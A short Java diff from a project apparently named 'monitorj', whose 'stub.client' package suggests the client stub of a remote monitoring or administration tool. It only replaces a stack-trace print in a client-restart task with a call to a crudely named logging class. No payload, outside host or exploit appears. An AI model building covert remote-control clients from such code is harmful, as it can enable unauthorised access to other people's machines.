@@ -5,6 +5,7 @@ import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
 import me.jershdervis.monitorj.stub.util.ExecutionUtil;
+import wiki.mtf.utils.FuckingPrintln;
 
 import java.io.IOException;
 import java.net.URISyntaxException;
@@ -27,7 +28,7 @@ public class RestartClientApplicationTask extends PacketTask {
                 System.exit(0);
             }
         } catch (URISyntaxException e) {
-            e.printStackTrace();
+            FuckingPrintln.out(e.getStackTrace());
         }
     }
 }
